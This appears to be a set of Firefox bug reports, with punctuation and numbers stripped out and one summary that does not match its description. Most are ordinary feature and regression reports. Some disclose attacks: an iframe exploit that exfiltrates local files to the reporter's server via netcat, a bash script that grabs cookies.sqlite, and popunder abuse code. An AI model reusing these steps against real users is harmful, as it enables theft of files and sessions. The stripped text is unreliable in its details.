Summary: Pref for fingerprinting resistance in private browsing mode
Description: proposal     i would like to propose a boolean pref   privacy resistfingerprinting pbm   when true  this pref would enable fingerprinting resistance in private browsing windows only   privacy resistfingerprinting pbm    true  all private browsing windows resist fingerprinting  all non pb windows do not    false    normal behavior     background     firefox currently has a boolean pref called  privacy resistfingerprinting   the fingerprinting resistance mechanism spoofs or hides numerous characteristics of the user s system from content pages  such as screen dimensions  installed fonts  etc   privacy resistfingerprinting has two values    true  all content pages resist fingerprinting   false    normal behavior     purpose     users expect private browsing windows should protect their privacy  according to a recent survey by duckduckgo          •     ±     believe that private browsing  prevents websites from tracking me     •     ±     believe that private browsing  prevents ads from tracking me        providing an option to enable fingerprinting resistance in private browsing windows will help to meet these user expectations  in the future    we might consider enabling the proposed pref by default

Summary: Consider tuning the smooth scroll speed for mouse wheel scrolling
Description: i was comparing the different scroll behavior s between chrome  edge  and firefox  and noticed that firefox has a slower mouse wheel scroll than the others   i think it would be worthwhile to review the scroll animation we re using  to increase perceptual responsiveness  i personally feel like shortening the animation duration could do this   the scroll animation duration is configurable  the prefs for mouse wheel are   general smoothscroll mousewheel durationmaxms     general smoothscroll mousewheel durationminms     i have these prefs halved to    and i feel like scrolling is more responsive   i know this is pretty subjective  so i d like to get ux opinions on this   i will link or attach screencasts of mouse wheel scrolling on the different browsers

Summary: Handle deduped child IDs when reordering folder children

Description: open following pdf and print it to pdf    valiant papers instanceopt pdf  the new pdf has some math symbols showing up as missing glyphs   check in third page   line   for example

Summary: Remove weak reupload for creation dates

Summary: Cross-device passwords data loss
Description: elkhoury status    the most plausible cause  i think  is     somehow a desktop device decided to track all of its logins    e g   after a node reassignment    during upload  either data loss occurred    or the login manager was unavailable in such a way that the sync proceeded but every record was apparently missing     mark  any other diagnosis you think is likely

Summary: Can we avoid places main thread IO before the first window is shown?
Description: see this startup profile on the quantum reference hardware      during early startup  we spend   calling mozilla  storage  service  openunshareddatabase from mozilla  places  database  initfaviconsdatabasefile and   calling it from mozilla  places  database  initdatabasefile   we also spend   in mozilla  storage  connection  close  called from mozilla  places  database  initfaviconsdatabasefile  do we really need to close this database   during startup   if making all of this io async is difficult    could we delay some of this to after the first window is shown

Summary: Consider an undo buffer per tab instead of a single one for the awesomebar
Description: type any address in address bar e g  google com and press enter  cut the text from address bar by  ctrl x   click  open a new tab   type any other address   e g  archive org and press enter  click first tab  press  ctrl z  to come back google com     ff comes back not google com but archive org

Summary: About:home / About:newtab Search Suggest Pop-up Doesn't Have a Fixed Width
Description: created attachment   search suggest pop up is long  str    search for a very long thing from a search access point   open a new tab   start a new search string with the first few characters of your really long search history item   see a very long search suggest pop up that scrolls off the edge of the window  expected results    search suggest pop up retains fixed width and search history item is cropped

Summary: Opening links from other programs in Firefox/Thunderbird is broken, shows "X is already running, but not responding" message
Description: str    set thunderbird as your default e mail application    open thunderbird    open any page in firefox       in adressbar  click       choose  email link     actual result  thunderbird doesn t open a new compose window  i get the following window   thunderbird is already running  but is not responding  the old thunderbird process must be closed to open a new window    can anyone confirm this behavior

Summary: Allowed permission to iframe element will let attackers read sensitive files[Mozilla Firefox v56.0.2(64-bit)]
Description: created attachment   firefoxbug docx  user agent  mozilla       applewebkit         version     safari        steps to reproduce   exploit code  the exploit code is very simple    meta http equiv  content type  content  text html  charset utf        html   body    script        dynamically creating an iframe     change the file path below            document body innerhtml   html  body  center    testing       center   body   html    var profileiframe   document createelement   profileiframe setattribute   profileiframe setattribute   profileiframe setattribute  contentwindow document body innerhtml     document body appendchild               dynamically creating an img element which will send the content to my server  change the ip address and port number below      function receive     console log   var profileiframe   document createelement   profileiframe setattribute   document body appendchild       script    body   html   steps to reproduce       copy a  html file on desktop  copy the above exploit code and paste it in the file      setup a netcat listener in your server    open the file using a firefox browser            the screenshot of netcat listener is below    actual results   i was able to exfiltrate the files in the local filesystem    expected results   this vulnerability is fixed in most other versions and return the error called  error  permission denied to access property  x   please check the attached file for detailed report

Summary: Change of url #hash makes new request on svg image and img
Description: user agent  mozilla       gecko   firefox     build id     steps to reproduce      visit url   start block   end block    product              open console  log requests and enter next code to change  hash part of image url     javascript code to see how image var img   document queryselector   var base url   img src  var out       settimeout   out   base url   view top   img src  out         settimeout   out   base url   view right   img src   out         settimeout   out   base url   view front   img src   out          actual results   when image src href is changed firefox makes new requests to fetch resource  but only  hash part of url is changed not whole url itself     here is attached log of how it behaves with image inside svg    this is image tag in svg                    image preserveaspectratio  none  width     height     xlink href   userdata products   svg   view top par     url of image tag           href         svganimatedstring   baseval    userdata products   svg   view top par   animval    userdata products   svg   view top par              href baseval           userdata products   svg   view top par     here is change of hash to view front par           href baseval     userdata products   svg   view front par            userdata products   svg   view front par    firefox makes new request while we only change          get     userdata products   svg  http       not modified      firefox on tested       makes new request on  img  and on  image  in svg   expected results   firefox should see if  hash part of url is changed   if yes it should not make any new request as it happens with iframe  main window  this works without problem on chrome on windows linux  the problem itself is that resource url itself will not change as that part of  hash url is never send to server   so server just replies   ok or   not modified while in chrome request itself is never made in first place   i am not sure if this is correct behavior  but if  hash url cannot change server response  i guess this request should not be made   hopefully this is understandable  if something is needed just ask

Summary: Firefox cookies sqlite db stored unencrypted on macOS
Description: user agent  mozilla       applewebkit       chrome         safari      steps to reproduce   os  macos sierra       firefox version         a security problem related to firefox cookies sqlite database which is stored unencrypted and not immune against any external service malware accessing   as a test the database resides here   home library application support firefox profiles  could be grabbed with this bash script poc       bin bash   simple browsers cookies grabber by  seekurity mkdir   desktop cookies    grab firefox cookies   searches for the default profile name path    file   path cookies sqlite  cp   file    desktop cookies firefoxcookies db  and could be used for a later use by extracting all the valuable user s sessions and other data   also i managed to read the database by any  sqlite db management apps eg  db browser for sqlite  without any effort to decrypt or even doing anything    actual results   firefox cookies sqlite database is readable by any     expected results   cookies sqlite database must be encrypted on macos with the current user s keychain credentials and non readable by other applications

Summary: Find out why the GPU-accelerated tab throbbers caused Talos regressions
Description: in bug    an svg image was landed for the new loading   connecting throbbers in tabs  we used gpu accelerated rotation transforms to ensure that these throbbers animated at   as much as possible   when it landed  one of the things we noticed was a talos regression   that was filed as bug    specifically  the following talos changes were noticed   regressions        kraken summary osx     opt                      tsvgx summary osx     opt                        damp summary   opt                             summary osx     opt                         damp summary   pgo                           tsvgr opacity summary osx     opt                    responsiveness   opt                      responsiveness   pgo                    tsvgx summary   opt                            summary   opt                             summary   pgo                           tsvgx summary   pgo                     improvements        tart summary osx     opt                       tart summary   opt                      tart summary   opt                         tart summary   pgo                      tart summary   pgo                     similarly  higher cpu usage was noticed with the new throbbers  bug   was filed for that  and a patch was landed that took a chunk of the cpu usage regression away  but not all   bug   was backed out because of the above reasons  meaning that we re now using the animated pngs again  which means that these animations can jank when the main thread gets blocked      part of the rationale for backing out the new throbbers is because photon is going to replace the throbbers with a new design anyways    the animations in bug     are all going to be gpu accelerated  so we should take this opportunity to at least understand   the reason why the throbbers caused the regression  we should do that soon  so that we can be prepared when the new animations land

Summary: MousePosTracker flushes layout on mouse move
Description: see this profile        several things could be improved here     this code is what causes the layout flushes  could we get the same result using something that doesn t flush    central rev   browser base content browser js       this  x   event screenx   fullzoom   window mozinnerscreenx      this  y   event screeny   fullzoom   window mozinnerscreeny     we add the mousemove and dragover event listeners unconditionally in  delayedstartup at   central rev   browser base content browser js   but this code won t actually be of any use unless mousepostracker addlistener has been called at least once  we have only   places in our code that add these listeners  it s only when we are in full screen mode  or when the statusbar panel is displayed    we should instead add the mousemove and dragover event listeners in mousepostracker addlistener  and remove them in mousepostracker removelistener if the set of listeners becomes empty     we should replace  this  listeners foreach     with  for let listener of this  listeners    to reduce overhead

Summary: Sync should re-fetch history collection after places restore.
Description: due to a mishap involving a poorly written shell command  i accidentally deleted  places sqlite      places was able to restore it  but since places doesn t back up history  my history was entirely gone  syncing didn t restore it until i opened a console and manually called resetclient  on the history engine   this might be a regression from bug    a bug we ve always had  or intentional behavior    either way  i think we could do better here with only a little effort

Summary: Block cookies for HTTP and HTTPS when a scheme-less origin is added
Description: bug   was filed by a user who added the string  seattletimes com  as an origin to block cookies from  this was interpreted as    but i argue that it would make more sense to infer that the user wants to block both http and https when the origin provided does not include an explicit scheme

Summary: Animations of elements that have transform-style: preserve-3d are even more broken in Firefox 58
Description: user agent  mozilla       applewebkit       chrome         safari      steps to reproduce   css translate animations are not working in ads on firefox   when transform style  preserve   is set  this might be related to bug   bug cgi id   but i think it s more common than the overflow hidden case because ads are served within iframes which clip the ad content by default  animations of content that slide into view no longer work in firefox     create a file named firefoxanimationbug html with the following text    doctype html   html    head     meta charset  utf        meta name  viewport  content  width device width  initial scale          style type  text css           div         position  absolute        background color  green        left           top           height           width           transform style  preserve          transform             animation  slide in   linear     normal forwards             keyframes slide in                      transform              animation timing function  linear                             transform              animation timing function  linear                    style    head    body a green div should slide into view     div   div    body     html    create another file named loader html with the following text    doctype html   html   head     meta charset  utf       head   body    iframe src  firefoxanimationbug html  style  border    solid black   width     height       iframe     body    html   open loader html in chrome and note that a green div animates across the iframe  open loader html in firefox and note that the green div just shows up at the right side of the iframe without any animation    actual results   animations of content that slide into view no longer work in firefox      expected results   animations of content that slide into view should continue working like in previous versions of firefox  they do work in the release version of all major browsers

Description: from   analysis tree  customizableui toolbar  we ve got   customizableui toolbar used features  property    method    constructor   selectors  toolbar customizable  true          customizableui toolbar menubar autohide     used features  field    handler    method    constructor    destructor       selectors   toolbar menubar autohide  true          customizableui toolbar drag     used features  field    constructor       selectors   toolbar menubar not    tabstoolbar     nav bar    there s a bit of trickiness around the selectors these apply to  but just eyeballing it  i think we could set up a custom element on something like   toolbar is  customizable toolbar    as an alternative to   customizable  true     folding the  drag  variation into the main element and conditionally apply that behavior based on id   platform  and then have   toolbar is  customizable toolbar menubar autohide    as an alternative to   toolbar menubar autohide  true    or something like that   one thing we ll have to confirm is that the  customizable  and  autohide  attributes don t change at runtime    since we can t change which custom element applies at runtime     source is here    central source browser components customizableui content toolbar xml

Summary: encoded params in urls get decoded when displayed by firefox
Description: user agent  mozilla       gecko   firefox     build id     steps to reproduce   just create a page with links like this    a href    callback http       back                params in callback  a   br    a href    callback http       back                params outside callback  a   and open in firefox   add a url like this for even more confusion   a href    callback http       back                 valuea   valueb  params in both  a    actual results   if you mouse over the first and second links  firefox displays the same thing in the status bar    callback   a b          the console displays the same link as well  both on the main network window and under console network headers request url   because of this incorrect representation  we also have a mismatch with  console network params  where correct params are displayed  therefore not matching the url   the third url is even worse  we don t even know what param belongs to what  it becomes    callback   a b           valuea   valueb   expected results   the url encoded params should not be decoded  it s very confusing and misleading for developers and users   it could also be used to confuse people and craft dodgy urls first and second urls are different urls  and should be represented as such     headers url     callback http       back                 params  callback   a b            header url     callback http       back                 params   callback   a b          third url simply doesn t make any sense and should be     header url     callback http       back                 valuea   valueb   params   callback   a b           valuea   valueb  basically  do the same as chrome

Summary: Basic auth dialogs can be abused for popunders and DoS
Description: note  while this is not a security vulnerability per se  viewing should probably be restricted so that it does not get abused for malicious purposes   currently  basic auth dialogs are modal to the main browser window  and they cause the browser window to gain focus  this can easily be abused to create popunder windows       script      function popunder            var popup   window open           var popunder   window open           script    button onclick  popunder   popunder  button       moreover  by repeatedly  loading a url that requires basic digest authentication  this could lead to denial of service as the user would be unable to interact with the browser normally due to endless modal dialogs   i think basic digest authentication dialogs should be converted to non modal dialogs instead

Summary: Remove dynamic HPKP implementation
Description: user agent  mozilla       applewebkit       chrome         safari      steps to reproduce   note that firefox  hpkp implementation exists and works        expected results   for the reasons given in    topic blink dev    chrome is removing   hpkp    we are getting close to removing our implementation     the existence of hpkp in a major browser poses risks   even to sites that do not use hpkp  since adoption has proven infinitesimal  we strongly believe that the risks of hpkp outweigh its benefits  for sites that really want to pin  pre loading is still possible and provides the benefit without as much risk

Summary: SVG transform-origin and transform-box with small viewBox and floated numbers
Description: user agent  mozilla       gecko   firefox     build id     steps to reproduce   in firefox in order to have real transform origin  center we have to add transform box  fill box  it works very well in casual situations  but there are some problems   when we have small svg s viewbox   and we have to use floated numbers in order to provide exact center position in svg space there is some strange behaviour — fill box is ignored   first svg     set small svg viewbox  viewbox                  create  rect  which will be a square half of svg size in the center of svg       add css class to the rectangle with  transform origin  center  and  transform box  fill box      add css transform animation   to the rectangle     add lines which will divide svg space into   exact quarters for clarity      set bigger svg viewbox  viewbox                do points     but with scale to new viewbox     actual results        left rectangle   is rotating in the center of the top left quarter  the right rectangle   is rotating in the center of svg     additional first svg has bolder   lines than second svg  like the width would be rounded instead of setting exact number          expected results   both rectangles   should be rotating in the center of each svg    left lines should be as thin as the right svg s lines   in chrome everything works well

Summary: Unique constraint failures recording observer notifications in the mirror
Description: the most frequent errors in event telemetry so far  excluding  database disk image malformed     are     error  encountered during statement execution  unique constraint failed  itemschang   error  encountered during statement execution  unique constraint failed  guidschang   error  encountered during statement execution  unique constraint failed  itemsadded  so we re trying to record observer notifications for items that we ve already processed  my first guess is deduping   the  mergestates  table has  primary key    so it s possible to insert duplicate local and remote guids  as long as their corresponding remote or local guids are different      this could also be related to bug    where an incorrectly parented root causes us to walk its children multiple times  though  unlike  placessyncutils bookmarks pullchanges   the query we use to build the local tree starts at the places root  not the content roots     the  itemsadded  error is especially interesting  since its primary key is  guid   the same   item must be duplicated in  mergestates

Summary: Global zoom doesn't function correctly in iframes with fission enabled

Summary: createImportedBookmarksFolder callers hard-code their sourceNameStr so subclasses get the wrong name
Description: callers of  migrationutils createimportedbookmarksfolder   hard code their first argument rather than getting it from the class instance  this means that all of the subclasses of  chromeprofilemigrator  all end up with the bookmark folder  from google chrome  instead of chromium canary etc

Summary: Search suggestions on new tab overflow
Description: user agent  mozilla       gecko   firefox      steps to reproduce      open a new tab     in the search box  enter  asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf asdf  or something else lengthy       submit the search     open a new tab again     enter  a    in the search box    actual results   after step    the  search for       or whatever it is called in english  in german it s  nach     suchen mit    entry in the dropdown list extends that dropdown to a width larger than the window  after step   the search suggestion does the same  this forces a horizontal scrollbar to appear  that scrollbar makes the vertical scrollbar appear  and that scrollbar shifts the page visibly      expected results   either the entries in the dropdown should be truncated to limit the width  or at least the vertical scrollbar should either be consistently there or absent  to prevent the annoying page shift

Summary: Reduce CSS regressions with automation (e.g., selectors that become unused)
Description: there were a number of recent visual regressions  e g   bug    bug    bug    and parts of various design tweaks related ones re adjusting styles   potentially all of these would have been caught by some automation that noticed css rules no longer being applied because html structure changed or selector incorrectly updated   one tricky aspect is that there would need to be a relatively complete set of components to render making sure we get appropriate coverage   i believe   said there should be tooling available for something like this

Summary: about:config page title has "Configurations" which feels grammatically awkward
Description: right now  about config has the following title      advanced configurations  the trailing  s  feels grammatically awkward   the word  configuration    is already a collective noun  and can refer to the totality of all the various options   the plural form  configurations  really feels like it refers to multiple different possible configurations that you could apply     could we fix this to drop the trailing  s   so that the title is just   advanced configuration

Summary: UI tooltip and doorhanger show incorrect CA after CA change
Description: the ui lock tooltip and doorhanger show the incorrect ca after a ca change and page reload   reproduce thusly      create three fake ca certificates  say  fake ca     etc     create a page   on a webserver that can serve https     create a dns name for this site  say  foosite      create three site certs for cn foosite  one signed by fake ca    one signed by fake ca    etc     import the certs for fake ca   and fake ca   into ff  trust the certs to identify websites  do not import the cert for fake ca       setup the webserver for foosite to serve the foosite cert that s signed by fake ca       visit foosite in ff and notice that the tooltip and doorhanger say  verified by  fake ca        now shutdown the webserver and set it up to to serve the foosite cert that s signed by fake ca         reload foosite in ff and notice that the tooltip and doorhanger  still  say  verified by  fake ca        click  more information  and notice that website identity   verified by says  fake ca     as does the window got by clicking  view certificate      shutdown the webserver and set it up to to serve the foosite cert that s signed by fake ca         reload foosite in ff  notice the warning  and wipe your forehead

Summary: Empty redirects for blocked resources (like uBlock Origin)
Description: i was looking at the ublock origin wiki and they seem to have a really interesting creative feature for resources that are known to break sites when they are blocked     library empty redirect resources  basically  they package sanitized versions of resources that are to be blocked  including resources like   google analytics com ga js ↪ google analytics com analytics js ↪ google analytics com inpage linkid js ↪ google analytics com cx api js ↪ googletagservices com gpt js ↪ googletagmanager com gtm js ↪   that appear on the disconnect list  and they mislead pages into thinking that the genuine tracker script has been served    this may be a great way to prevent pages from breaking when tp goes to default on  and i didn t see any tickets open for it

Summary: Proxy: working is impossible without using setting: "Use Password Manager to remember <PROXY's> password"
Description: user agent  mozilla       gecko   firefox      steps to reproduce      proxy server with authorization    firefox settings      general  network settings  manual proxy configuration        check the box   use this proxy  server for all protocols     try to open an any url   actual results      an authorization dialog of a proxy server appears      enter correct auth data but not check box  use password manager to remember this password     authorization dialog of a proxy server some times appear when opening any web page  the user is forced to constantly enter a password because the dialog constantly appears  work is impossible in this mode    expected results   authorization dialog of proxy server should be appear one first time only  firefox should store this proxy s auth data for current sessions when user successfully authorization on proxy server and use it in all own running instances   it worked good in all firefox s versions prior

Summary: Authenticate OAuth-related requests with sessionToken, not assertions
Description: when firefox wants to perform an oauth related service request  it currently uses a browserid assertion to authenticate itself to the oauth server api   i found two places where is does this  one here when  making a new oauth access token              let assertion   await this getassertion         let result   await client gettokenfromassertion       and one here when  authorizing a new oauth client connection              const assertion   await this getassertion         return client authorizecodefromassertion        recent versions of the fxa server allow oauth requests to be directly authenticated with a  sessiontoken  rather than indirecting through a browserid assertion  one day we hope to be able to deprecate browserid assertions entirely  so it would be useful to move desktop away from using them where possible   let s update  fxaccountsoauthgrantclient  so that      gettokenfromassertion  becomes  getaccesstokenfromsessiontoken   and calls      oauth token    using a  sessiontoken  rather than the current endpoint using a browserid assertion     authorizecodefromassertion  becomes  authorizecodefromsessiontoken   and calls      oauth authorization    using a  sessiontoken  rather than the current endpoint using a browserid assertion

Summary: User initiates leaving a study

Summary: Leaving Pioneer - modal and cleanup
Description: wireframes    page   screen id    annotation id       as an enrolled pioneer user  i want to leave the pioneer program  so that i m no longer contributing data       user sees a  leave  button because they are already enrolled in pioneer     the pioneer main program copy tells the user that we will mark their data for deletion when they leave pioneer     onclick  leave   show a confirmation modal   telling them that we will delete their data and will not be able to use it for public good        if the user continues and  leaves   we revert their state to no longer a member of pioneer and trigger a data deletion      for leaving pioneer  we delete all pioneer panel data and data for all open studies       we uninstall core panel add on and all study add ons  clean up and take the trash out      pioneer icon removed from firefox toolbar     onclick  cancel   close the modal  no deletion  no disenrollment  the user remains in pioneer

Description: top sites that send the attribution request replace search shortcut tiles but would be pushed out by history entries  to prevent that  we decided to automatically pin such top sites

Summary: ModalPrompter falls back to window prompts for subframe BrowsingContexts
Description: currently  when prompting with a bc of a subframe   modalprompter  will fail to get the window actor and fallback to a window prompt    for example  running this on a page with an iframe will result in a window prompt      services prompt alertbc       using the top browsing context  here   probably fixes this

Summary: Make proposal v2 for letting experiment extensions create their own result types with custom views, plus prototype
Description: this is a follow up to bug    my  initial proposal   is complete  and the next step is to incorporate the initial feedback and work on a prototype  mike suggested i file a bug for this so that this work is tracked and pointed

Summary: Update forceShowMessage in ToolbarPanelHub to handle a single message
Description: certain snippets and test messages in devtools no longer render correctly  because forceshowmessage is now expecting an array of message objects  forceshowmessage should be updated to handle a single message object

Summary: nsIPromptService: support for async prompting
Description: ideally  most of our prompting should be async  we should extend the nsipromptservice with methods for async prompting  which return a promise   this way we could avoid event loop issues when opening multiple prompts  like in bug

Summary: Add reserved domains to list of known TLDs for awesomebar
Description: reserved tlds   will never appear on the psl  because they reserved  however these are still well known tlds that are often used for local development  i think we should not do a search for these domains and make the life easier for developers using firefox

Summary: Add telemetry for downloads and download panel usage
Description: ur revealed that users struggle to find the download panel once a download is made  leading to users redownloading files  there is no telemetry currently for file downloads or download panel usage to understand how frequent of a use case downloading a file is and how much of a problem finding the download panel is once you achieve a file download   user stories    as a product manager i d like to understand if file download is a frequent use case  so that i can focus efforts on making it a great experience    as a product manager i want to understand if users experience pain when attempting to find doanloaded files  so i can clarify if it could be a churn driver   acceptance criteria    new telemetry allows identifying share of dau mau that downloads files   new telemetry allows identifying number of files downloaded per profile per day   new telemetry allows understanding the ratio number of files downloaded   number of  times download panel was opened per profile

Description: i think it should be removed for the following reasons    maintenance cost     outdated styles     it should really be global to all notification bars

Summary: See if the providers manager or provider base class can manage query lifetimes instead of having every provider subclass do it
Description: every provider subclass does something like this      js class providersubclass     constructor           maps the running queries by querycontext      this queries   new map         async startquery        let instance           this queries set               this queries delete         cancelquery        this queries delete              it s not a big deal  but it would be nice if the providers manager or provider base class could take care of managing the lifetime of  this queries  and its contents  then subclasses would only need to access  this queries  after they do something async   we could even abstract that away so that subclasses could call a method like  this querystillactive   after an async operation  that method would be implemented in the base class of course

Summary: Some websites do not show video context menu for video content due to transparent overlays on the video
Description: in order to activate pip mode  go to about config  media videocontrols picture in picture enabled needs to be set to true   to activate the feature media videocontrols picture in picture video toggle enabled needs to be set to true   to activate the toggle media videocontrols picture in picture video toggle flyout enabled needs to be set to true   to activate the  flyout  toggle on the first  video  that users see on a page media videocontrols picture in picture video toggle flyout wait ms   controls how long the  flyout  toggle waits before sliding back    go to following pages as examples          play any available video  notice that pip blue toggle is available on the right side    while playing the video  right click over video to show context menu    in context menu  look for  picture in picture  option to activate pip mode   actual results  pip option is not available in context menu videos   expected  pip option is  available in context menu videos   note  in   pip option from context menu is only available for one second when the video starts to load  then is another context menu the one that appears

Summary: MSI Installer for Firefox
Description: created attachment   firefox        user agent  mozilla       gecko   firefox      steps to reproduce   downloaded the msi installer of firefox and recognized that it s just an exe wrapper instead of a real msi installer    actual results   the msi installer extracted an exe installer and installed it the exe way    expected results   msi installer should behave like a msi installer that could be modified by transform files   attached you find my msi installer sources for firefox      it lacks of   default browser agent scheduled task     installation id     installation update of new versions    upgrade should be done by group policy with remove new installation instead of updating  in app updating could be done by msp patch files but is not possible with group policy software installation   to build   extract  core  directory of the exe installer to   or     run build wxs bat   remove components of firefox exe and helper exe from files wxs  they are defined in product wxs     run build bat

Summary: network.proxy.backup.socks breaks proxy dialog
Description: user agent  mozilla       gecko   firefox      steps to reproduce   in a pretty old firefox profile on my work pc when i go to settings network and in the proxy dialog choose manual settings i can t fill in the socks proxy settings  when i start typing the letters disappear instantly   i had to go to about settings and reset each and every setting to default until i found that deleting these two actually helps       network proxy backup socks        network proxy backup socks port    i never edited these settings manually before  however i did have frigate installed in the past   see this forum topic for additional info     f   t   p        actual results   letters disappear   expected results   the remnants of uninstalled addons like network proxy backup socks should not break typing in the proxy dialog

Summary: Increase maximum size of the sidebar
Description: currently the sidebar is limited in how wide it can go      html  browser id  sidebar  flex     autoscroll  false  disablehistory  true  disablefullscreen  true  style  min width     width     max width      tooltip  ahtmltooltip         this doesn t take into account larger screens  and for some use cases   it can be nice to have a larger area  i would propose the max width should be doubled to     when  side view   was a privileged extension   we increased the max width as part of the extension  since it s become a normal extension and can t make this modification we ve received feedback from people disappointed in the limitation  so i believe the larger size was appreciated

Summary: Clipboard actions with Disqus comments are broken
Description: user agent  mozilla       gecko   firefox      steps to reproduce   enter some text in a disqus comment box  copy   paste some text into that same  box      actual results   unpredictable number of newlines are inserted in and around existing text  new text is pasted to a unpredictable location      expected results   it should behave like a normal text edit box

Description: created attachment   ff homepage white  user agent  mozilla       gecko   firefox      steps to reproduce   in kde settings i select   breeze dark  theme  in ff settings i select  operating system color scheme  theme then i go to ff homepage  instead of black   actual results   ff homepage background is white    expected results   ff homepage background is black

Summary: wrong time zone with enterprise policy enabled

Summary: don't show the override button if security.tls.version.enable-deprecated is a locked preference

Summary: Specialize Windows to return .jpg for image/jpeg when it would return .jfif
Description: it sounds like there s a bug around after windows   creator that sets  jfif as the default extension for image jpeg  while it should still be working normally  a lot of users complain because not all the software accepts that extension  this is stored in the registry hkey classes root mime database content type image jpeg we could specialize our windows code to return jpg as default extension for image jpeg when jfif would instead be returned

Summary: Feature Request: Replace Sort By Name with Sort by URL, but sorting as detailed
Description: user agent  mozilla       gecko   firefox      steps to reproduce   sorting a folder by the alphabetical value of the title attribute really isn t helpful anymore   the attribute is very often abused with keywords  long  and doesn t cluster things together in an easily discoverable way   what would be useful is to sort by url  by domain   this could be done as such                               this essentially sorts by domain  then tld  subdomain  rest of url  and finally whether http or https   this clusters similar urls together   as an example  with metafilter com  this would keep files from ask metafilter com and www metafilter com sorted more closely together   or mail google com  accounts google com  etc  sorted together   using this sort  like sites are clustered together

Summary: Include colorway variant in tooltip string for accessibility
Description: current string is  use this colorway  but screen readers might only read the tooltip without the button text  this affects both about welcome and upgrade spotlight

Summary: Sponsored Topsites should retrieve their icons from Contile CDN
Description: icons used for sponsored top site tiles should be delivered via mozilla s cdn called contile  this will allow us to update icons as needed without having to ride the trains   this is the front end implementation of work in   bug cgi id

Summary: Telemetry: Add snippets and top sites
Description: add  top sites  and  snippets  to activity stream telemetry  this was done already in   bug cgi id   for spocs and pocket

Summary: Add dismiss functionality to PBM messages
Description: currently messages don t have a dismiss functionality  we want to leverage messaging system and track impression counts vs lifetime

Summary: Description for remote defaults should be per configuration
Description: i e  to describe the targeting  not per feature

Summary: Validate enrolled experiments whenever we call ExperimentManager.add in tests
Description: we ran into a situation where we were storing invalid enrolled experiments in tests so we missed a bug – we should make it impossible to add enrollments in tests that aren t valid

Summary: Apply sentence casing to top line of App menu
Description: apply sentence casing to  sync and save data     sign in   intention is to have all of the menu with sentence casing per bug   though this bug blocks

Summary: [proton] Fuzzy icons and text on toolbar with proton dark theme
Description: created attachment   swappy     png  user agent  mozilla       gecko   firefox      steps to reproduce   enable proton dark theme on   april s nightly   actual results   fuzzy icons and text   expected results   clear  crisp icons and text

Summary: DOS: nightly tries to import LOTS of passwords from mac keychain, each one requiring auth
Description: for some reason  today s nightly is trying to import lots and lots of keys from the mac os x big sur intel system keychain   each import pops up an   app modal system dialog requiring a password     firefox nightly would like to export the key  apple id authentication             gmt      out of your keychain   in order to allow this  enter the password for the keychain  login    doing anything that causes the dialog to close immediately causes a new one  effectively dosing firefox

Summary: Individual topsites tile meatball menus don't exist anymore
Description: not sure what part of our work regressed this  when newtab update   prefs are off  we should be able to access individual topsite tile menus

Summary: Stop showing Mozilla VPN campaign messages in PBM in regions where it is not available
Description: the  default value   for pbm is to show the mozilla vpn message in all regions

Summary: Stop recording event telemetry when Firefox Suggest prefs are set on startup to default-enable the offline scenario
Description: we fixed bug   by  setting some prefs   on the default branch on every startup  for two of those prefs   browser urlbar suggest quicksuggest  and  browser urlbar suggest quicksuggest sponsored   we have a listener that  records telemetry events   whenever they re toggled  unfortunately that means these events are recorded on every startup    probably not great   it s not important  but for completeness  one caveat is that if you set those prefs to false  then the pref listener doesn t fire so we don t record events  so the bug here only manifests for users where offline is the default and they haven t opted out of suggestions

Summary: Add click telemetry for wikipedia / adm quick suggest extensions
Description: the wikipedia extension currently doesnt record user clicks  adm uses partnerlinkattribution but if we want to switch it to use dynamic result types we might also want to have it record its own click telemetry

Summary: Reenable browser_PermissionUI.js
Description: disabled in   bug cgi id

Summary: Context menu navigation icons aren't positioned properly
Description: according to the design spec  the navigation icons need to be closer to the edges    currently they re each centered within their own boxes where each box is     of the legnth  so they re evenly spaced  which is correct  but too far away from the edges

Summary: Enable browser_PermissionUI test again for all platforms
Description: this test has been disabled for some os due to high intermittent failure rate    central rev   browser modules test browser browser permissionui js  once a fix for the issue landed in bug   we should enable the test again

Summary: land final "More from Mozilla" en-US experiment strings
Description: the basic work here is to make more from mozilla localizable    it may also make sense to spin off a bug to make it remotely localizable  the way spotlight jsm is   what that would entail could depend on whether there is more than just the preferences surface being touched in the updated   designs   punam  would love to hear any thoughts you have here

Summary: There are gaps between the Proton tabs, causing missed clicks and accidental window drags

Summary: Investigate reports of misalignment in the new download progress indicator
Description: there have been some reports that the filled progress disc is not centered inside the outer ring in the new download button progress indicator    one example     firefox nightly proton has got an update that   this progress indicator is composed of an outer element   downloads indicator progress outer  which is simply a  border radius      and   solid border color to draw the ring  and an inner element    downloads indicator progress inner  which is also border radius     and a  conic gradient  background to render the progressive pie slice states    see    central source browser themes shared downloads indicator inc css      we should figure out what platforms settings conditions this reproduces on  and what options exist to fix it

Summary: Support Snap Assist on Win11

Summary: New thin icons look worse on 1x screens
Description: created attachment   icons png  user agent  mozilla       gecko   firefox      steps to reproduce   compared  how toolbar icons look on firefox   and new firefox   nightly release on standard  non hidpi screen  fedora      actual results   new thin icons look worse  they have noticeable edges and some grey outlines  looks like that icons were not aligned to pixel grid  there are visible single pixel  aliasing  effects    expected results   consider  normal   non hidpi screens when designing icons  to keep them looking great

Summary: Minimize/Maximize/close buttons aren't properly shown in Light Theme.
Description: created attachment   close minimize button png    affected versions                        affected platforms     ubuntu      steps to reproduce      open firefox     open the customize toolbar menu     from the theme selector select the light theme     observe the minimize maximize close buttons     expected result     the minimize maximize close buttons are properly shown     actual result     the minimize maximize close buttons aren t properly shown  check attachment    regression range   will provide one asap

Summary: On Linux, privacy.resistfingerprinting interferes with about:newtab dark mode styling
Description: using privacy resistfingerprinting appears to interfere with dark theme styling using a gtk dark theme on some system pages    as well as extension tooltips    i imagine that by design resistfingerprinting is supposed to prevent sending theming information to websites  however it shouldn t really work like that on system pages  it is probably something that depends on the referenced bug which used to affect all linux users  if i disable privacy resistfingerprinting  dark mode on about newtab works properly
